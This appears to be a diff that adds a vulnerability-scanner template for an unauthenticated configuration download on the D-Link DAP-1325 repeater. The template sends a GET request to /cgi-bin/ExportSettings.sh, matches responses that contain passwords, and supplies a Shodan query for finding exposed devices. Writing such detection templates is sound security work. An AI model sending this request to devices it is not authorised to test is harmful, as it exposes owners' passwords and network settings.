@@ -1,0 +1,38 @@
+http:
+- matchers:
+  - case-insensitive: true
+    part: body
+    type: word
+    words:
+    - Password
+  - condition: and
+    part: header
+    regex:
+    - filename="(.*)_Settings.dat
+    - application/octet-stream
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/cgi-bin/ExportSettings.sh'
+id: dlink-config-dump
+info:
+  author: gy741
+  description: 'Security vulnerability known as Unauthenticated access to settings
+    or Unauthenticated configuration download. This vulnerability occurs when a device,
+    such as a repeater, allows the download of user settings without requiring proper
+    authentication.
+
+    '
+  metadata:
+    max-request: 1
+    shodan-query: title:"D-LINK"
+  name: D-Link DAP-1325 - Information Disclosure
+  reference:
+  - https://www.exploit-db.com/exploits/51556
+  - https://www.dropbox.com/s/eqz0ntlzqp5472l/DAP-1325.mp4?dl=0
+  severity: critical
+  tags: misconfig,config,dump,dlink,auth-bypass,disclosure
